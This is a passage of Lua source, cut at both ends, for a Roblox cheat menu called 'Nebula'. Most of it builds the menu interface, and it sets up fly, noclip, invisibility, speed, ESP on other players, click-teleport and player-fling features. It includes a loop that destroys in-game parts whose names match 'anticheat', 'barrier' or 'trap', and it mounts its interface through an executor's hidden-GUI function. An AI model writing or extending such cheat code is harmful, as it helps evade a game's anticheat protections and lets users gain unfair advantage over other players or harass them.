table.insert(allTextElements, dotIndicator)

fadeIn:Play()
scaleIn:Play()
posIn:Play()

for i, element in ipairs(allTextElements) do
    task.delay(i * 0.05, function()
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            TweenService:Create(element, tweenInfo, { TextTransparency = 0 }):Play()
        elseif element.Name == "DotIndicator" then
            TweenService:Create(element, tweenInfo, { BackgroundTransparency = 0 }):Play()
        end
    end)
end

closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.78,
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 140, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 180, 255))
        })
    }):Play()
end)

closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.88,
        TextColor3 = Color3.fromRGB(210, 210, 230)
    }):Play()
    TweenService:Create(buttonGradient, TweenInfo.new(0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 160, 245))
        })
    }):Play()
end)

closeButton.MouseButton1Click:Connect(closeGui)
]]

local V = {}
local C = { All = {} }
local Cache = { Distances = {}, FPSBoost = {}, Lighting = nil, PostEffects = {} }
local ConfigRegistry = {}

local Keybinds = {
    Fly = Enum.KeyCode.F,
    Noclip = Enum.KeyCode.V,
    Invisible = Enum.KeyCode.C,
    DesyncFly = Enum.KeyCode.G,
    ESP = Enum.KeyCode.E,
    Speed = Enum.KeyCode.R,
    Respawn = Enum.KeyCode.B,
    Menu = Enum.KeyCode.Insert
}

local KeybindCallbacks = {}
local KeybindButtons = {}
local KeybindSystem = { Binding = false, BindingName = nil, BindingBtn = nil }

V.INVISIBILITY_POSITION = Vector3.new(0, 100000, 0)
V.FOV = 70

local DefaultConfig = {
    Speed = 16, SpeedEnabled = true, Jump = 50, JumpEnabled = true, 
    CFrameSpeed = false, WallClimb = false,
    Fly = false, FlySpeed = 150, DesyncFly = false, DesyncFlySpeed = 150,
    AntiRagdoll = false, Noclip = false, NoAnim = false, Invis = false, InfJump = false,
    InstInteract = false, InfRange = false,
    ESP = false, ESPSelf = false, ESPBox = false, ESPFilled = false, ESPName = false, ESPDist = false,
    Fullbright = false, FPSBoost = false,
    Force1st = false, Force3rd = false, UnlockZoom = false,
    FOV = 70,
    SpinSpeed = 100, Spin = false, ClickTP = false,
    AntiAFK = false, Notif = true, Watermark = false
}

local function getCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end
local function getHumanoid()
    local char = getCharacter()
    return char:WaitForChild("Humanoid")
end
local function getRoot()
    local char = getCharacter()
    return char:WaitForChild("HumanoidRootPart")
end

local parentTarget = (gethui and gethui()) or game.CoreGui

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Nebula"
ScreenGui.Parent = parentTarget
ScreenGui.ResetOnSpawn = false

local ESPGui = Instance.new("ScreenGui")
ESPGui.Name = "NebulaESP"
ESPGui.Parent = parentTarget
ESPGui.ResetOnSpawn = false
ESPGui.IgnoreGuiInset = true

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 640, 0, 480)
MainFrame.Position = UDim2.new(0.5, -320, 0.5, -240)
MainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
MainFrame.BackgroundTransparency = 0.03
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 14)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 1.2
UIStroke.Color = Color3.fromRGB(55, 55, 62)
UIStroke.Transparency = 0.4
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = MainFrame

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(1, -60, 1, 0)
TitleText.Position = UDim2.new(0, 22, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "NEBULA"
TitleText.TextColor3 = Color3.fromRGB(240, 240, 248)
TitleText.Font = Enum.Font.GothamBlack
TitleText.TextSize = 19
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Parent = TitleBar

local TitleAccent = Instance.new("Frame")
TitleAccent.Size = UDim2.new(0, 3, 0, 16)
TitleAccent.Position = UDim2.new(0, 14, 0.5, -8)
TitleAccent.BackgroundColor3 = Color3.fromRGB(180, 180, 195)
TitleAccent.BorderSizePixel = 0
TitleAccent.Parent = TitleBar

local TitleAccentCorner = Instance.new("UICorner")
TitleAccentCorner.CornerRadius = UDim.new(1, 0)
TitleAccentCorner.Parent = TitleAccent

local TitleLine = Instance.new("Frame")
TitleLine.Size = UDim2.new(1, -44, 0, 1)
TitleLine.Position = UDim2.new(0, 22, 0, 49)
TitleLine.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
TitleLine.BorderSizePixel = 0
TitleLine.Parent = TitleBar

local SearchBar = Instance.new("TextBox")
SearchBar.Size = UDim2.new(0, 150, 0, 26)
SearchBar.Position = UDim2.new(1, -160, 0.5, -13)
SearchBar.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
SearchBar.BorderSizePixel = 0
SearchBar.PlaceholderText = "Rechercher..."
SearchBar.Text = ""
SearchBar.TextColor3 = Color3.fromRGB(210, 210, 222)
SearchBar.Font = Enum.Font.GothamMedium
SearchBar.TextSize = 12
SearchBar.TextXAlignment = Enum.TextXAlignment.Left
SearchBar.Parent = TitleBar

local SearchPadding = Instance.new("UIPadding")
SearchPadding.PaddingLeft = UDim.new(0, 8)
SearchPadding.Parent = SearchBar

local SearchCorner = Instance.new("UICorner")
SearchCorner.CornerRadius = UDim.new(0, 6)
SearchCorner.Parent = SearchBar

local ResizeHandle = Instance.new("TextButton")
ResizeHandle.Size = UDim2.new(0, 20, 0, 20)
ResizeHandle.Position = UDim2.new(1, -20, 1, -20)
ResizeHandle.BackgroundTransparency = 1
ResizeHandle.BorderSizePixel = 0
ResizeHandle.Text = ""
ResizeHandle.Parent = MainFrame

local function createResizeDot(xScale, yScale)
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 2.5, 0, 2.5)
    dot.Position = UDim2.new(xScale, 0, yScale, 0)
    dot.BackgroundColor3 = Color3.fromRGB(120, 120, 132)
    dot.BorderSizePixel = 0
    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = dot
    dot.Parent = ResizeHandle
end

createResizeDot(0.2, 0.7)
createResizeDot(0.5, 0.5)
createResizeDot(0.8, 0.2)

local resizing = false
local startMousePos = Vector3.new()
local startSize = UDim2.new()

ResizeHandle.MouseButton1Down:Connect(function()
    resizing = true
    startMousePos = UserInputService:GetMouseLocation()
    startSize = MainFrame.Size
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        resizing = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if resizing and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = UserInputService:GetMouseLocation() - startMousePos
        local newWidth = math.clamp(startSize.X.Offset + delta.X, 550, 1100)
        local newHeight = math.clamp(startSize.Y.Offset + delta.Y, 400, 800)
        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
    end
end)

local TabContainer = Instance.new("ScrollingFrame")
TabContainer.Size = UDim2.new(0, 145, 1, -65)
TabContainer.Position = UDim2.new(0, 10, 0, 55)
TabContainer.BackgroundTransparency = 1
TabContainer.ScrollBarThickness = 0
TabContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
TabContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
TabContainer.ScrollingDirection = Enum.ScrollingDirection.Y
TabContainer.ClipsDescendants = true
TabContainer.Parent = MainFrame

local TabList = Instance.new("UIListLayout")
TabList.Padding = UDim.new(0, 5)
TabList.Parent = TabContainer

local Tabs = {}
local TabNames = {"Movement", "Me", "ESP", "Teleport", "Joueur", "Server", "Fun", "Scripts", "Settings", "Config", "Code"}
local ContentFrames = {}
local TabIcons = {
    "rbxassetid://4483345998", "rbxassetid://4483345998", "rbxassetid://4483345998", 
    "rbxassetid://4483345998", "rbxassetid://4483345998", "rbxassetid://4483345998", 
    "rbxassetid://4483345998", "rbxassetid://4483345998", "rbxassetid://4483345998", 
    "rbxassetid://4483345998", "rbxassetid://4483345998", "rbxassetid://4483345998"
}

local function createTab(name, icon)
    local Tab = Instance.new("TextButton")
    Tab.Size = UDim2.new(1, 0, 0, 34)
    Tab.BackgroundColor3 = Color3.fromRGB(22, 22, 27)
    Tab.BorderSizePixel = 0
    Tab.Text = ""
    Tab.Parent = TabContainer

    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 8)
    TabCorner.Parent = Tab

    local TabIcon = Instance.new("ImageLabel")
    TabIcon.Size = UDim2.new(0, 18, 0, 18)
    TabIcon.Position = UDim2.new(0, 10, 0.5, -9)
    TabIcon.BackgroundTransparency = 1
    TabIcon.Image = icon
    TabIcon.Parent = Tab

    local TabLabel = Instance.new("TextLabel")
    TabLabel.Size = UDim2.new(1, -45, 1, 0)
    TabLabel.Position = UDim2.new(0, 36, 0, 0)
    TabLabel.BackgroundTransparency = 1
    TabLabel.Text = name
    TabLabel.TextColor3 = Color3.fromRGB(150, 150, 162)
    TabLabel.Font = Enum.Font.GothamMedium
    TabLabel.TextSize = 12
    TabLabel.TextXAlignment = Enum.TextXAlignment.Left
    TabLabel.Name = "TabLabel"
    TabLabel.Parent = Tab

    local IconIndicator = Instance.new("Frame")
    IconIndicator.Size = UDim2.new(0, 3, 0, 18)
    IconIndicator.Position = UDim2.new(0, 2, 0.5, -9)
    IconIndicator.BackgroundColor3 = Color3.fromRGB(60, 60, 68)
    IconIndicator.BorderSizePixel = 0
    IconIndicator.BackgroundTransparency = 1
    IconIndicator.Name = "Indicator"
    IconIndicator.Parent = Tab

    local IconIndicatorCorner = Instance.new("UICorner")
    IconIndicatorCorner.CornerRadius = UDim.new(1, 0)
    IconIndicatorCorner.Parent = IconIndicator

    Tab.MouseEnter:Connect(function()
        if Tab.BackgroundColor3 ~= Color3.fromRGB(32, 32, 39) then
            TweenService:Create(Tab, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(26, 26, 32)}):Play()
        end
    end)
    Tab.MouseLeave:Connect(function()
        if Tab.BackgroundColor3 ~= Color3.fromRGB(32, 32, 39) then
            TweenService:Create(Tab, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(22, 22, 27)}):Play()
        end
    end)

    return Tab
end

for i, name in ipairs(TabNames) do
    Tabs[name] = createTab(name, TabIcons[i])
end

local ContentArea = Instance.new("Frame")
ContentArea.Size = UDim2.new(1, -170, 1, -75)
ContentArea.Position = UDim2.new(0, 160, 0, 60)
ContentArea.BackgroundTransparency = 1
ContentArea.Parent = MainFrame

for _, name in ipairs(TabNames) do
    local Content = Instance.new("ScrollingFrame")
    Content.Size = UDim2.new(1, 0, 1, 0)
    Content.BackgroundTransparency = 1
    Content.CanvasSize = UDim2.new(0, 0, 0, 0)
    Content.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Content.ScrollBarThickness = 2
    Content.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 55)
    Content.Visible = false
    Content.Parent = ContentArea

    local ContentList = Instance.new("UIListLayout")
    ContentList.Padding = UDim.new(0, 8)
    ContentList.Parent = Content

    local Padding = Instance.new("UIPadding")
    Padding.PaddingRight = UDim.new(0, 6)
    Padding.Parent = Content

    ContentFrames[name] = Content
end

ContentFrames["Movement"].Visible = true

local function createToggle(name, default, callback, parent, configKey)
    local ToggleFrame = Instance.new("Frame")
    ToggleFrame.Size = UDim2.new(1, 0, 0, 44)
    ToggleFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    ToggleFrame.BorderSizePixel = 0
    ToggleFrame.Parent = parent

    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 8)
    ToggleCorner.Parent = ToggleFrame

    local ToggleLabel = Instance.new("TextLabel")
    ToggleLabel.Size = UDim2.new(0.62, 0, 1, 0)
    ToggleLabel.Position = UDim2.new(0, 14, 0, 0)
    ToggleLabel.BackgroundTransparency = 1
    ToggleLabel.Text = name
    ToggleLabel.TextColor3 = Color3.fromRGB(195, 195, 208)
    ToggleLabel.Font = Enum.Font.GothamMedium
    ToggleLabel.TextSize = 13
    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    ToggleLabel.Parent = ToggleFrame

    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Size = UDim2.new(0, 46, 0, 26)
    ToggleButton.Position = UDim2.new(1, -60, 0.5, -13)
    ToggleButton.BackgroundColor3 = default and Color3.fromRGB(140, 140, 155) or Color3.fromRGB(38, 38, 45)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Text = ""
    ToggleButton.Parent = ToggleFrame

    local ToggleButtonCorner = Instance.new("UICorner")
    ToggleButtonCorner.CornerRadius = UDim.new(1, 0)
    ToggleButtonCorner.Parent = ToggleButton

    local ToggleDot = Instance.new("Frame")
    ToggleDot.Size = UDim2.new(0, 20, 0, 20)
    ToggleDot.Position = default and UDim2.new(1, -23, 0.5, -10) or UDim2.new(0, 3, 0.5, -10)
    ToggleDot.BackgroundColor3 = Color3.fromRGB(252, 252, 254)
    ToggleDot.BorderSizePixel = 0
    ToggleDot.Parent = ToggleButton

    local ToggleDotCorner = Instance.new("UICorner")
    ToggleDotCorner.CornerRadius = UDim.new(1, 0)
    ToggleDotCorner.Parent = ToggleDot

    local enabled = default

    local function setToggleState(state, force)
        if state == enabled and not force then return end
        enabled = state
        local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
        if enabled then
            TweenService:Create(ToggleButton, tweenInfo, {BackgroundColor3 = Color3.fromRGB(140, 140, 155)}):Play()
            TweenService:Create(ToggleDot, tweenInfo, {Position = UDim2.new(1, -23, 0.5, -10)}):Play()
        else
            TweenService:Create(ToggleButton, tweenInfo, {BackgroundColor3 = Color3.fromRGB(38, 38, 45)}):Play()
            TweenService:Create(ToggleDot, tweenInfo, {Position = UDim2.new(0, 3, 0.5, -10)}):Play()
        end
        callback(enabled)
    end

    local function toggleState()
        setToggleState(not enabled)
    end

    ToggleButton.MouseButton1Click:Connect(toggleState)
    
    if configKey then
        ConfigRegistry[configKey] = setToggleState
    end
    
    return ToggleFrame, setToggleState, toggleState
end

local function createSlider(name, min, max, default, callback, parent, configKey)
    local SliderFrame = Instance.new("Frame")
    SliderFrame.Size = UDim2.new(1, 0, 0, 60)
    SliderFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    SliderFrame.BorderSizePixel = 0
    SliderFrame.Parent = parent

    local SliderCorner = Instance.new("UICorner")
    SliderCorner.CornerRadius = UDim.new(0, 8)
    SliderCorner.Parent = SliderFrame

    local SliderLabel = Instance.new("TextLabel")
    SliderLabel.Size = UDim2.new(1, -28, 0, 20)
    SliderLabel.Position = UDim2.new(0, 14, 0, 6)
    SliderLabel.BackgroundTransparency = 1
    SliderLabel.Text = name .. ": " .. tostring(default)
    SliderLabel.TextColor3 = Color3.fromRGB(170, 170, 182)
    SliderLabel.Font = Enum.Font.GothamMedium
    SliderLabel.TextSize = 12
    SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
    SliderLabel.Parent = SliderFrame

    local SliderBar = Instance.new("TextButton")
    SliderBar.Size = UDim2.new(1, -28, 0, 5)
    SliderBar.Position = UDim2.new(0, 14, 0, 34)
    SliderBar.BackgroundColor3 = Color3.fromRGB(38, 38, 45)
    SliderBar.BorderSizePixel = 0
    SliderBar.Text = ""
    SliderBar.Parent = SliderFrame

    local SliderBarCorner = Instance.new("UICorner")
    SliderBarCorner.CornerRadius = UDim.new(1, 0)
    SliderBarCorner.Parent = SliderBar

    local SliderFill = Instance.new("Frame")
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    SliderFill.BackgroundColor3 = Color3.fromRGB(160, 160, 175)
    SliderFill.BorderSizePixel = 0
    SliderFill.Parent = SliderBar

    local SliderFillCorner = Instance.new("UICorner")
    SliderFillCorner.CornerRadius = UDim.new(1, 0)
    SliderFillCorner.Parent = SliderFill

    local SliderKnob = Instance.new("Frame")
    SliderKnob.Size = UDim2.new(0, 16, 0, 16)
    SliderKnob.Position = UDim2.new((default - min) / (max - min), -8, 0.5, -8)
    SliderKnob.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
    SliderKnob.BorderSizePixel = 0
    SliderKnob.Parent = SliderBar

    local SliderKnobCorner = Instance.new("UICorner")
    SliderKnobCorner.CornerRadius = UDim.new(1, 0)
    SliderKnobCorner.Parent = SliderKnob

    local value = default
    local dragging = false

    local function updateSlider(input)
        local relativeX = math.clamp((input.Position.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
        value = math.floor(min + (max - min) * relativeX)
        SliderFill.Size = UDim2.new(relativeX, 0, 1, 0)
        SliderKnob.Position = UDim2.new(relativeX, -8, 0.5, -8)
        SliderLabel.Text = name .. ": " .. tostring(value)
        callback(value)
    end

    local function setSliderValue(val)
        val = math.clamp(val, min, max)
        local relativeX = (val - min) / (max - min)
        value = val
        SliderFill.Size = UDim2.new(relativeX, 0, 1, 0)
        SliderKnob.Position = UDim2.new(relativeX, -8, 0.5, -8)
        SliderLabel.Text = name .. ": " .. tostring(value)
        callback(value)
    end

    SliderBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            updateSlider(input)
        end
    end)

    SliderBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            updateSlider(input)
        end
    end)

    if configKey then
        ConfigRegistry[configKey] = setSliderValue
    end

    return SliderFrame, setSliderValue
end

local function createButton(name, callback, parent)
    local ButtonFrame = Instance.new("Frame")
    ButtonFrame.Size = UDim2.new(1, 0, 0, 38)
    ButtonFrame.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    ButtonFrame.BorderSizePixel = 0
    ButtonFrame.Parent = parent

    local FrameCorner = Instance.new("UICorner")
    FrameCorner.CornerRadius = UDim.new(0, 8)
    FrameCorner.Parent = ButtonFrame

    local FrameStroke = Instance.new("UIStroke")
    FrameStroke.Thickness = 0.8
    FrameStroke.Color = Color3.fromRGB(40, 40, 48)
    FrameStroke.Transparency = 0.5
    FrameStroke.Parent = ButtonFrame

    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 1, 0)
    Button.BackgroundTransparency = 1
    Button.Text = name
    Button.TextColor3 = Color3.fromRGB(195, 195, 208)
    Button.Font = Enum.Font.GothamMedium
    Button.TextSize = 13
    Button.Parent = ButtonFrame

    Button.MouseEnter:Connect(function()
        TweenService:Create(ButtonFrame, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(35, 35, 42)}):Play()
        TweenService:Create(Button, TweenInfo.new(0.18), {TextColor3 = Color3.fromRGB(230, 230, 240)}):Play()
    end)
    Button.MouseLeave:Connect(function()
        TweenService:Create(ButtonFrame, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(26, 26, 32)}):Play()
        TweenService:Create(Button, TweenInfo.new(0.18), {TextColor3 = Color3.fromRGB(195, 195, 208)}):Play()
    end)
    Button.MouseButton1Click:Connect(callback)
    return ButtonFrame
end

local function createLabel(text, parent)
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, 0, 0, 22)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(120, 120, 132)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 9
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = parent
    return Label
end

local function switchTab(tabName)
    for name, frame in pairs(ContentFrames) do
        frame.Visible = false
    end
    for name, tab in pairs(Tabs) do
        tab.BackgroundColor3 = Color3.fromRGB(22, 22, 27)
        local lbl = tab:FindFirstChild("TabLabel")
        if lbl then
            lbl.TextColor3 = Color3.fromRGB(150, 150, 162)
        end
        local indicator = tab:FindFirstChild("Indicator")
        if indicator then
            TweenService:Create(indicator, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        end
    end
    ContentFrames[tabName].Visible = true
    Tabs[tabName].BackgroundColor3 = Color3.fromRGB(32, 32, 39)
    local activeLbl = Tabs[tabName]:FindFirstChild("TabLabel")
    if activeLbl then
        activeLbl.TextColor3 = Color3.fromRGB(225, 225, 235)
    end
    local activeIndicator = Tabs[tabName]:FindFirstChild("Indicator")
    if activeIndicator then
        activeIndicator.BackgroundTransparency = 0
        TweenService:Create(activeIndicator, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(180, 180, 195)}):Play()
    end
end

for tabName, tab in pairs(Tabs) do
    tab.MouseButton1Click:Connect(function()
        switchTab(tabName)
    end)
end

switchTab("Movement")

local SearchMap = {
    ["fly"] = "Movement", ["noclip"] = "Me", ["speed"] = "Movement", ["jump"] = "Me",
    ["invisible"] = "Me", ["teleport"] = "Teleport", ["waypoint"] = "Teleport", ["joueur"] = "Joueur",
    ["attach"] = "Joueur", ["fling"] = "Joueur", ["spin"] = "Fun", ["fun"] = "Fun", ["fov"] = "Me",
    ["ragdoll"] = "Me", ["interact"] = "Me", ["range"] = "Me", ["respawn"] = "Me", ["esp"] = "ESP", ["box"] = "ESP", ["distance"] = "ESP", ["name"] = "ESP",
    ["server"] = "Server", ["rejoin"] = "Server", ["hop"] = "Server", ["fullbright"] = "Server", ["time"] = "Server",
    ["fps"] = "Server", ["boost"] = "Server", ["afk"] = "Settings", ["keybind"] = "Settings",
    ["unload"] = "Settings", ["watermark"] = "Settings", ["config"] = "Config", ["save"] = "Config",
    ["code"] = "Code", ["execute"] = "Code", ["script"] = "Scripts", ["scripts"] = "Scripts", ["click"] = "Fun"
}

SearchBar:GetPropertyChangedSignal("Text"):Connect(function()
    local txt = string.lower(SearchBar.Text)
    if txt == "" then return end
    for keyword, tabName in pairs(SearchMap) do
        if string.find(keyword, txt) then
            switchTab(tabName)
            break
        end
    end
end)

local MovementContent = ContentFrames["Movement"]
local MeContent = ContentFrames["Me"]
local ESPContent = ContentFrames["ESP"]
local TeleportContent = ContentFrames["Teleport"]
local JoueurContent = ContentFrames["Joueur"]
local ServerContent = ContentFrames["Server"]
local FunContent = ContentFrames["Fun"]
local ScriptsContent = ContentFrames["Scripts"]
local SettingsContent = ContentFrames["Settings"]
local ConfigContent = ContentFrames["Config"]
local CodeContent = ContentFrames["Code"]

V.Speed = 16
V.SpeedEnabled = true
V.Jump = 50
V.JumpEnabled = true
V.FlySpeed = 150
V.DesyncFlySpeed = 150
V.Fly = false
V.Noclip = false
V.InfJump = false
V.DesyncFly = false
V.CFrameSpeed = false
V.WallClimb = false
V.Invis = false
V.Notif = true
V.AntiAFK = false
V.NoAnim = false
V.Spin = false
V.SpinSpeed = 100
V.Watermark = false
V.AntiRagdoll = false
V.InstInteract = false
V.InfRange = false
V.FPSBoost = false
V.Fullbright = false
V.ESP = false
V.ESPBox = false
V.ESPFilled = false
V.ESPName = false
V.ESPDist = false
V.ESPSelf = false
V.ESPColor = Color3.fromRGB(255, 255, 255)
V.ESPObjects = {}
V.OrigAnim = nil
V.SelPlayer = nil
V.Spectate = false
V.Attached = nil
V.NoAnimConn = nil
V.AttachConn = nil
V.SpinConn = nil
V.AntiRagdollConn = nil
V.Inst1 = nil
V.Inst2 = nil
V.Inf1 = nil
V.Inf2 = nil
V.InfRangeConn = nil
V.FPSBoost1 = nil
V.FPSBoost2 = nil
V.ToggleKeyConn = nil
V.ClickTP = false
V.ClickTPTool = nil
V.Flinging = false
V.FlingTarget = nil
V.FlingConn = nil

local function addConnection(conn)
    table.insert(C.All, conn)
end

V.AntiBlockConn = RunService.Heartbeat:Connect(function()
    pcall(function()
        local char = LocalPlayer.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local parts = workspace:GetPartBoundsInBox(hrp.CFrame, Vector3.new(8, 8, 8))
                for _, part in ipairs(parts) do
                    local name = part.Name:lower()
                    if name:match("block") or name:match("trap") or name:match("barrier") or name:match("anticheat") then
                        if part.Parent ~= char and not part:IsDescendantOf(char) then
                            part:Destroy()
                        end
                    end
                end
            end
        end
    end)
end)
addConnection(V.AntiBlockConn)

local currentFPS = 60
local frames = 0
local lastTime = os.clock()
V.FPSConn = RunService.RenderStepped:Connect(function()
    frames += 1
    local currentTime = os.clock()
    if currentTime - lastTime >= 0.5 then
        currentFPS = math.floor(frames / (currentTime - lastTime))
        frames = 0
        lastTime = currentTime
    end
    if Camera.FieldOfView ~= V.FOV then
        Camera.FieldOfView = V.FOV
    end
end)
addConnection(V.FPSConn)

local NotificationContainer = Instance.new("Frame")
NotificationContainer.Name = "NotificationContainer"
NotificationContainer.Size = UDim2.new(0, 300, 1, -20)
NotificationContainer.Position = UDim2.new(1, -320, 0, 20)
NotificationContainer.BackgroundTransparency = 1
NotificationContainer.Parent = ScreenGui

local NotifList = Instance.new("UIListLayout")
NotifList.Padding = UDim.new(0, 10)
NotifList.VerticalAlignment = Enum.VerticalAlignment.Top
NotifList.Parent = NotificationContainer

local function notify(title, text, color)
    if not V.Notif then return end
    color = color or Color3.fromRGB(180, 180, 195)

    local NotifFrame = Instance.new("Frame")
    NotifFrame.Size = UDim2.new(1, 0, 0, 60)
    NotifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    NotifFrame.BorderSizePixel = 0
    NotifFrame.BackgroundTransparency = 1
    NotifFrame.Parent = NotificationContainer

    local NotifCorner = Instance.new("UICorner")
    NotifCorner.CornerRadius = UDim.new(0, 8)
    NotifCorner.Parent = NotifFrame

    local NotifStroke = Instance.new("UIStroke")
    NotifStroke.Thickness = 1
    NotifStroke.Color = color
    NotifStroke.Transparency = 1
    NotifStroke.Parent = NotifFrame

    local TitleLbl = Instance.new("TextLabel")
    TitleLbl.Size = UDim2.new(1, -20, 0, 20)
    TitleLbl.Position = UDim2.new(0, 10, 0, 8)
    TitleLbl.BackgroundTransparency = 1
    TitleLbl.Text = title
    TitleLbl.TextColor3 = color
    TitleLbl.Font = Enum.Font.GothamBold
    TitleLbl.TextSize = 14
    TitleLbl.TextXAlignment = Enum.TextXAlignment.Left
    TitleLbl.TextTransparency = 1
    TitleLbl.Parent = NotifFrame

    local TextLbl = Instance.new("TextLabel")
    TextLbl.Size = UDim2.new(1, -20, 0, 20)
    TextLbl.Position = UDim2.new(0, 10, 0, 30)
    TextLbl.BackgroundTransparency = 1
    TextLbl.Text = text
    TextLbl.TextColor3 = Color3.fromRGB(195, 195, 208)
    TextLbl.Font = Enum.Font.GothamMedium
    TextLbl.TextSize = 12
    TextLbl.TextXAlignment = Enum.TextXAlignment.Left
    TextLbl.TextTransparency = 1
    TextLbl.Parent = NotifFrame

    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    TweenService:Create(NotifFrame, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(NotifStroke, tweenInfo, {Transparency = 0}):Play()
    TweenService:Create(TitleLbl, tweenInfo, {TextTransparency = 0}):Play()
    TweenService:Create(TextLbl, tweenInfo, {TextTransparency = 0}):Play()

    task.delay(3, function()
        local tweenOut = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
        TweenService:Create(NotifFrame, tweenOut, {BackgroundTransparency = 1}):Play()
        TweenService:Create(NotifStroke, tweenOut, {Transparency = 1}):Play()
        TweenService:Create(TitleLbl, tweenOut, {TextTransparency = 1}):Play()
        TweenService:Create(TextLbl, tweenOut, {TextTransparency = 1}):Play()
        task.wait(0.6)
        NotifFrame:Destroy()
    end)
end

local function startFly()
    if V.DesyncFly then SetDesyncToggle(false) end
    V.Fly = true
    pcall(function()
        local char = getCharacter()
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")

        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end

        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.MaxTorque = Vector3.new(400000, 400000, 400000)
        bodyGyro.P = 30000
        bodyGyro.D = 1000
        bodyGyro.CFrame = Camera.CFrame
        bodyGyro.Parent = root

        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3.new(400000, 400000, 400000)
        bodyVelocity.P = 30000
        bodyVelocity.Velocity = Vector3.zero
        bodyVelocity.Parent = root

        local flyConn = RunService.RenderStepped:Connect(function()
            if not V.Fly then
                if bodyGyro then bodyGyro:Destroy() end
                if bodyVelocity then bodyVelocity:Destroy() end
                flyConn:Disconnect()
                return
            end

            local moveVector = Vector3.zero
